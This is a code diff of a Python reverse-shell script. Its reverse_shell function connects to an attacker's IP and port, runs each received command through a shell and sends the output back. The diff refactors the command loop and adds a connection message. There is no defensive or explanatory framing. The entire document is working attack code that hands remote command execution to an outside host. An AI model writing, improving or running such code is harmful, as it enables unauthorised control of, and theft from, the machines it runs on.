@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import sys
 
 # Function to install missing libraries
 def install_dependencies():
@@ -21,26 +22,26 @@ def install_dependencies():
 # Reverse shell function
 def reverse_shell(attacker_ip, attacker_port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
     try:
         # Connect to the attacker machine
         s.connect((attacker_ip, attacker_port))
+        print(f"Connected to {attacker_ip} on port {attacker_port}")
 
-        # Start a command shell and redirect input/output to the socket
         while True:
-            # Receive command from Kali Linux machine
-            command = s.recv(1024).decode("utf-8")
-            if command.lower() == "exit":
+            # Receive command from the attacker machine
+            command = s.recv(1024).decode('utf-8')
+            if command.lower() == 'exit':
                 break
             
             # Execute the command and send the result back
-            if command.strip():
-                output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                result = output.stdout.read() + output.stderr.read()
-                s.send(result if result else b"Command executed, but no output.\n")
+            if command:
+                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output, error = process.communicate()
+                s.send(output + error)
     
     except socket.error as err:
         print(f"Connection error: {err}")
+    
     finally:
         s.close()
 
